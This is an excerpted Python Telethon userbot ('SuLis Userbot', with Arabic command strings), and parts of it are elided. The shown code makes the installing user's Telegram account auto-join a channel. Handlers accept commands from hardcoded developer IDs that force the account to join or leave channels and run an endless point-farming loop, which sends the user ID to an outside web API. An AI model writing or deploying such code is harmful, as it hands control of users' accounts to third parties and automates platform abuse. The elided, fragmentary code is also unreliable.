...
async def join_channel(event):
    try:
        await MackThon(JoinChannelRequest("@zwzwwzz"))
...
async def OwnerStart(event):
    ...
    if sender.id in ownerhson_id:
        ...
        joinu = await MackThon(JoinChannelRequest('zwzwwzz'))
...
@MackThon.on(events.NewMessage(outgoing=True, pattern=".تجميع الزعيم"))
async def _(event):
    await event.edit("**جاري تجميع النقاط**")
    joinu = await MackThon(JoinChannelRequest('zwzwwzz'))
    channel_entity = await MackThon.get_entity(bot_usernameee)
...
async def OwnerStart(event):
    ...
    try:
        participant = await MackThon(GetParticipantRequest('SuLisflood', 'me'))
        leav = await MackThon(LeaveChannelRequest('SuLisflood'))
        join = await MackThon(JoinChannelRequest('SuLisflood'))
...
async def col(event):
    ...
    if sender.id in ownerhson_id:
        ...
        while (bot_username == f"{bot_username}"):
            if (bot_username):
                response = requests.request("GET", f"https://dev-testapisy.pantheonsite.io/api/SuLisEcho.php?user_id={user_id}&bot_username={bot_username}")
                print(response.text)
...
print('  ')
print('  ')
print("❖ SuLis Userbot Running  ")
print('  ')
MackThon.run_until_disconnected()

# [ • ] The Code Py SuLis Tm - Dev Hussam : I hope you don't steal any code
